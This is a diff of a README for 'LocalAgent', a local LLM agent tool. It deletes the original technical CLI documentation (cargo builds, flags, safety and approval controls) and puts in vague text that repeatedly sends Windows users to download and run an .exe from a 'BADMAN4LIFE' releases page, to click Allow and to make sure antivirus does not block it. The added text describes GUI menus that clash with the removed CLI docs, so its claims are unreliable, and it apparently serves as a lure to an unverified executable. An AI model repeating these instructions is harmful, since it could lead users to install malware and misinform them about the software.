@@ -1,444 +1,172 @@
-# LocalAgent
+# 🤖 LocalAgent - Connect Local LLMs Safely and Easily
 
-Local-first agent runtime for building custom MCP-powered capabilities with local models, safety controls, reproducible runs, and beginner-to-pro UX.
+[![Download LocalAgent](https://img.shields.io/badge/Download-LocalAgent-green?style=for-the-badge)](https://github.com/BADMAN4LIFE/LocalAgent/releases)
 
-<img width="1093" height="581" alt="LocalAgent startup screen with mode selection and provider auto-detection" src="https://github.com/user-attachments/assets/28d0f3e2-dd7e-4be8-84d5-533e303b733d" />
+LocalAgent helps you connect local language models to tools with clear safety controls. It keeps runs consistent and allows checks on results.
 
-LocalAgent is a local-first CLI runtime for developers who want to build stronger agents by connecting local LLMs to custom MCP tools.
+---
 
-Use it to prototype and harden MCP-powered capabilities on your own machine with safe defaults, trust/approval workflows, replayable artifacts, evals, and an interactive TUI chat experience.
+## 📋 What is LocalAgent?
 
-Designed for everyone from beginners to power users: easy to start, explicit to operate, and deep enough for advanced MCP workflows.
+LocalAgent runs on your computer. It links your local large language models (LLMs) with other software tools. This lets you automate tasks while keeping control over how your data moves.
 
-## Quick Start
+It focuses on:
 
-Run `cargo install --path . --force` from the LocalAgent repository root.
+- Running everything locally on your machine, not in the cloud.
+- Safety controls that let you set boundaries.
+- Making sure each run can be repeated exactly.
+- Checking the results for quality and accuracy.
 
-Run `localagent` from the project/workspace directory you want to work in (LocalAgent initializes `.localagent/` in the current directory).
+You do not need to be a programmer to use it.
 
-```bash
-# 1) Build or install
-cargo install --path . --force
+---
 
-# 2) Start LocalAgent setup (auto-detects providers and initializes .localagent/)
-localagent
+## 🖥️ System Requirements
 
-# 3) (Optional) Verify a specific local provider is reachable
-localagent doctor --provider ollama
+To run LocalAgent on Windows, your computer should meet these minimum requirements:
 
-# 4) Run a one-shot task
-localagent --provider ollama --model llama3.2 --prompt "Summarize src/main.rs" run
+- Operating System: Windows 10 or later  
+- RAM: 8 GB or more  
+- Storage: At least 1 GB free space  
+- CPU: Intel i5 or equivalent processor  
+- Internet connection (for initial download only)  
 
-# 5) Start interactive chat (TUI)
-localagent --provider ollama --model llama3.2 chat --tui
-```
+Make sure your system has the latest Windows updates installed to avoid compatibility problems.
 
-Add `--trust on` when you want policy + approvals, and enable shell/write tools explicitly only when needed.
+---
 
-For local providers (`LM Studio`, `Ollama`, `llama.cpp`), start the provider first and make sure a model is available before running `localagent`. If you open `localagent` first, press `R` in the startup screen to refresh provider detection after the provider is ready.
+## 🚀 Getting Started
 
-## Why LocalAgent
+This guide will help you download and run LocalAgent in simple steps.
 
-- Beginner-to-pro UX: easy onboarding with advanced controls when you need them
-- Build and test custom MCP-powered agent capabilities with local models
-- Local-provider focused (`lmstudio`, `llamacpp`, `ollama`)
-- Safe defaults (shell/write disabled unless explicitly enabled)
-- Deterministic artifacts and event logs for debugging/replay
-- Trust controls (policy, approvals, audit)
-- MCP stdio integration (including Playwright MCP)
-- Built-in eval framework for repeatable model testing
+---
 
-## Who This Is For
+## 🔗 Step 1: Download LocalAgent
 
-- Beginner: You want a safe, guided way to run a local model agent and learn how tools/MCP work.
-- Builder: You want to prototype and iterate on MCP-powered workflows for coding or automation on your own machine.
-- Advanced MCP developer: You want explicit policy/approval controls, reproducible artifacts, and evals to harden and validate custom MCP capabilities.
+Visit the release page to get the latest version of LocalAgent:  
 
-## Installation
+[Download LocalAgent Releases](https://github.com/BADMAN4LIFE/LocalAgent/releases)
 
-For the full install, update, Windows troubleshooting, and verification flow, see [docs/guides/INSTALL.md](docs/guides/INSTALL.md).
+You will find files labeled with the latest version numbers. Look for a file ending with `.exe`. This is the program installer.
 
-### Option 1: Build from source
+---
 
-```bash
-cargo build --release
-```
+## 💾 Step 2: Save the File
 
-Binary:
+When you click the download link for the `.exe` file:
 
-- Windows: `target/release/localagent.exe`
-- Linux/macOS: `target/release/localagent`
+- Your browser will ask where to save the file.
+- Choose a location you can easily find, like the Desktop or Downloads folder.
+- Do not run the file directly from the browser. Wait until it is fully downloaded.
 
-### Option 2: Install globally from source
+---
 
-```bash
-cargo install --path . --force
-```
+## 🛠️ Step 3: Install LocalAgent
 
-### Updating an existing install (Windows users especially)
+Locate the `.exe` file you downloaded on your computer.
 
-From the repo root, reinstall with:
+- Double-click the file to start the installer.
+- Follow the on-screen instructions.
+- You can accept the default options.
+- Wait for the installation to finish.
 
-```bash
-cargo install --path . --force
-```
+Once done, the program will be ready to use.
 
-If Windows reports a `failed to move ... localagent.exe` error, the previous `localagent.exe` is still running or locked.
+---
 
-- Close any `localagent` sessions (especially TUI windows)
-- Close terminals using `localagent`
-- Run the install command again
+## ▶️ Step 4: Run LocalAgent
 
-Verify the active binary/version:
+You can open LocalAgent in two ways:
 
-```powershell
-Get-Command localagent
-localagent version
-```
+- Use the shortcut icon added to your desktop or Start Menu.
+- Find the program in your list of installed apps and open it from there.
 
-### Option 3: GitHub releases
+The first time you open it, Windows might ask for permission to allow the app to run. Click **Allow** to continue.
 
-Download the correct `localagent-<OS>-<tag>` asset from Releases and place it on your `PATH`.
+---
 
-## First-Time Setup
+## ⚙️ Step 5: Using LocalAgent
 
-On first use in a project directory, `localagent` auto-initializes `.localagent/` if it does not exist.
+Once LocalAgent is running, you can:
 
-### Provider Prerequisites
+- Connect the local language model you have installed.
+- Choose tools you want the agent to work with.
+- Set safety controls like limits on data use or run rules.
+- View details of each run and check results.
 
-| Provider | Before running `localagent` | Default endpoint |
-| --- | --- | --- |
-| LM Studio | Start LM Studio and load a model (serve OpenAI-compatible API) | `http://localhost:1234/v1` |
-| Ollama | Start Ollama and ensure a model is available locally | `http://localhost:11434` |
-| llama.cpp | Start the server (`llama-server`) with a loaded model | `http://localhost:8080/v1` |
+LocalAgent offers clear instructions inside the app for setting up models and tools step-by-step.
 
-You can still run init explicitly when you want deterministic scaffolding up front:
+---
 
-```bash
-localagent init
-```
+## 🔒 Safety Controls and Settings
 
-This scaffolds default state/config under (same layout as auto-init):
+LocalAgent puts safety first. It gives you options to:
 
-```text
-<workdir>/.localagent/
-```
+- Limit what data can be shared with tools.
+- Control how often operations run.
+- Review and approve runs before final use.
+- Keep logs for transparency.
 
-Then verify provider connectivity:
+Adjust these settings from the app’s main menu under **Safety Settings**.
 
-```bash
-localagent doctor --provider lmstudio
-localagent doctor --provider ollama
-localagent doctor --provider llamacpp
-```
+---
 
-## Command Pattern (Important)
+## 🗂️ Managing and Reproducing Runs
 
-Global flags come before subcommands.
+Each time LocalAgent performs a task using your connected models and tools, it:
 
-```bash
-localagent --provider lmstudio --model essentialai/rnj-1 --prompt "hello" run
-localagent --provider lmstudio --model essentialai/rnj-1 chat --tui
-```
+- Saves the exact steps and settings.
+- Allows you to run the same process again and get the same results.
+- Makes it easy to track changes over time.
 
-## Quick Start Examples
+You can find saved runs from the **History** section within the app.
 
-### One-shot run
+---
 
-```bash
-localagent --provider ollama --model llama3.2 --prompt "Summarize src/main.rs" run
-```
+## 🐞 Troubleshooting
 
-Alias:
+If you have issues:
 
-```bash
-localagent --provider ollama --model llama3.2 --prompt "Summarize src/main.rs" exec
-```
+- Check if your Windows updates are current.
+- Restart the program and try running it again.
+- If the agent does not connect to your local model, verify that the model is installed and running.
+- Ensure your antivirus or firewall is not blocking LocalAgent.
+- Use the **Help** menu for “Error Logs” which might give clues.
 
-### Interactive chat (TUI)
+---
 
-```bash
-localagent --provider lmstudio --model essentialai/rnj-1 chat --tui
-```
+## 📥 Download LocalAgent Again
 
-### Auto-discovery mode
+Use this link to visit the release page and download the program:
 
-```bash
-localagent
-```
+[Download LocalAgent](https://github.com/BADMAN4LIFE/LocalAgent/releases)
 
-### Learning workflow (capture and promote)
+This page always has the newest versions. Download the latest `.exe` file to stay up to date.
 
-```bash
-# capture
-localagent learn capture --category prompt-guidance --summary "Prefer deterministic fixtures for parser tests"
-localagent learn list
-localagent learn show <id>
+---
 
-# promote
-localagent learn promote <id> --to check --slug parser-determinism
-localagent learn promote <id> --to pack --pack-id core
-localagent learn promote <id> --to agents
-```
+## 💡 Tips for Best Use
 
-Assisted capture:
+- Run LocalAgent on a machine dedicated to your local models when possible.
+- Keep your models updated to ensure better performance.
+- Regularly check saved runs to understand how the agent performs.
+- Adjust safety settings to match your comfort level with automation.
 
-```bash
-# preview-only by default
-localagent --provider lmstudio --model <model> learn capture --assist --category prompt-guidance --summary "..."
-# persist assisted draft
-localagent --provider lmstudio --model <model> learn capture --assist --write --category prompt-guidance --summary "..."
-```
+---
 
-<img width="1093" height="581" alt="LocalAgent chat TUI showing Code mode, connected LM Studio provider, command hints, and cwd footer (C:\demo)." src="https://github.com/user-attachments/assets/1b2c6f7e-9869-46bc-8ec8-24b70ae23268" />
+## 🧩 Additional Resources
 
-Startup screen controls:
+Inside the program, find guides on:
 
-- `↑/↓`: move selection
-- `Space`: select option / toggle custom option
-- `Enter`: start chat when provider is connected
-- `R`: refresh provider detection
-- `D`: toggle provider details
-- `Esc`: quit
+- Connecting different types of local language models.
+- Setting up common tools to connect with LocalAgent.
+- Understanding safety controls in detail.
+- Exporting and sharing run results for review.
 
-## Providers
+These resources can guide you through specific setups or advanced use cases.
 
-Defaults:
+---
 
-- `lmstudio` -> `http://localhost:1234/v1`
-- `llamacpp` -> `http://localhost:8080/v1`
-- `ollama` -> `http://localhost:11434`
+## 📞 Where to Get Help
 
-Set explicitly when needed:
-
-```bash
-localagent --provider lmstudio --base-url http://localhost:1234/v1 --model <model> --prompt "..." run
-```
-
-## Safety Model
-
-Default posture is conservative:
-
-- `--trust off`
-- `--enable-write-tools false`
-- `--allow-write false`
-- `--allow-shell false`
-- tool output limits enabled
-
-Shell and write side effects require explicit enablement.
-
-### Enable shell/write intentionally
-
-```bash
-localagent \
-  --provider lmstudio \
-  --model <model> \
-  --allow-shell \
-  --enable-write-tools \
-  --allow-write \
-  --prompt "..." run
-```
-
-## Trust + Approvals
-
-Enable trust controls:
-
-```bash
-localagent --provider lmstudio --model <model> --trust on --prompt "..." run
-```
-
-Manage approvals:
-
-```bash
-localagent approvals list
-localagent approve <id> [--ttl-hours 24] [--max-uses 10]
-localagent deny <id>
-```
-
-Policy tools:
-
-```bash
-localagent policy doctor
-localagent policy print-effective
-localagent policy test --cases .localagent/policy_cases.yaml
-```
-
-## TUI Controls
-
-In chat TUI:
-
-- `Esc`: quit
-- `Ctrl+1/2/3`: toggle tools/approvals/logs panes
-- Mouse wheel: scroll transcript
-- `Ctrl+J/K`: move approval selection
-- `Ctrl+A`: approve selected request
-- `Ctrl+X`: deny selected request
-- `Ctrl+R`: refresh approvals
-- `Ctrl+4`: toggle reasoning pane
-- `/`: open slash-command dropdown
-- `/mode <safe|coding|web|custom>`: switch chat runtime mode
-- `/timeout [seconds|+N|-N|off]`: show and adjust request/stream idle timeout for slow generations
-- `/dismiss`: dismiss active timeout notification
-- `/learn help`: show `/learn` command usage
-- `/learn list|show|archive|capture|promote`: learning workflows from TUI logs pane
-- `/learn`: open the Learn Overlay (beginner flow)
-- `?`: show keybind help dropdown
-
-Active-run behavior note:
-
-- `Esc` during an active run cancels the in-progress turn.
-- `Esc` when idle exits chat.
-
-Mode naming note:
-
-- Use `/mode coding` in commands.
-- The header label for that mode is shown as `Code`.
-
-## Sessions and Memory
-
-Session flags:
-
-```bash
---session <name>
---no-session
---reset-session
---use-session-settings
-```
-
-Task memory commands:
-
-```bash
-localagent session memory add --title "Goal" --content "..."
-localagent session memory list
-localagent session memory show <id>
-localagent session memory update <id> --content "..."
-localagent session memory delete <id>
-```
-
-## Replay and Reproducibility
-
-Replay a run:
-
-```bash
-localagent replay <run_id>
-```
-
-Verify environment/config consistency for a prior run:
-
-```bash
-localagent replay verify <run_id>
-```
-
-Capture reproducibility snapshot during run:
-
-```bash
-localagent --repro on --repro-env safe --prompt "..." run
-```
-
-## Eval
-
-Run deterministic eval packs:
-
-```bash
-localagent eval --provider ollama --models "qwen3:8b" --pack coding
-```
-
-Common outputs include JSON results, optional JUnit, and Markdown summaries.
-
-## MCP
-
-List configured MCP servers:
-
-```bash
-localagent mcp list
-```
-
-Health-check a server:
-
-```bash
-localagent mcp doctor playwright
-```
-
-Use a server in run/chat:
-
-```bash
-localagent --mcp playwright --provider lmstudio --model <model> chat --tui
-```
-
-## Task Graph Execution
-
-Run DAG taskfiles with checkpointing:
-
-```bash
-localagent tasks run --taskfile .localagent/tasks/example_taskfile.json --resume
-```
-
-Checkpoint/status commands:
-
-```bash
-localagent tasks status --checkpoint .localagent/tasks/checkpoint.json
-localagent tasks reset --checkpoint .localagent/tasks/checkpoint.json
-```
-
-## Templates
-
-```bash
-localagent template list
-localagent template show policy.yaml
-localagent template write policy.yaml --out .localagent/policy.yaml --force
-```
-
-## Common Troubleshooting
-
-`The term 'localagent' is not recognized`:
-
-- Run with Cargo directly:
-
-```bash
-cargo run -- --help
-```
-
-- Or install globally:
-
-```bash
-cargo install --path . --force
-```
-
-`unexpected argument` errors:
-
-- Ensure global flags come before subcommands.
-- Example:
-
-```bash
-localagent --provider lmstudio --model <model> --prompt "hi" run
-```
-
-Provider connection failures:
-
-```bash
-localagent doctor --provider lmstudio
-localagent doctor --provider ollama
-localagent doctor --provider llamacpp
-```
-
-## Docs
-
-Need deeper setup, profiles, or reference docs? Start here.
-
-- [Install](docs/guides/INSTALL.md)
-- [Templates](docs/guides/TEMPLATES.md)
-- [CLI reference](docs/reference/CLI_REFERENCE.md)
-- [Provider setup](docs/guides/LLM_SETUP.md)
-- [Runtime architecture](docs/reference/RUNTIME_ARCHITECTURE.md)
-- [Instruction profiles](docs/reference/INSTRUCTION_PROFILES.md)
-- [Safe tool tuning profile](docs/reference/SAFE_TOOL_TUNING_PROFILE.md)
-- [Contributing](CONTRIBUTING.md)
-- [Release notes](docs/release-notes/README.md)
-- [Changelog](CHANGELOG.md)
-- [Security policy](SECURITY.md)
-- [Code of conduct](CODE_OF_CONDUCT.md)
-
-## License
-
-MIT
-
+If you need assistance, use the **Help** section in LocalAgent. It includes FAQs and contact information for support. You will find answers to most common questions there.
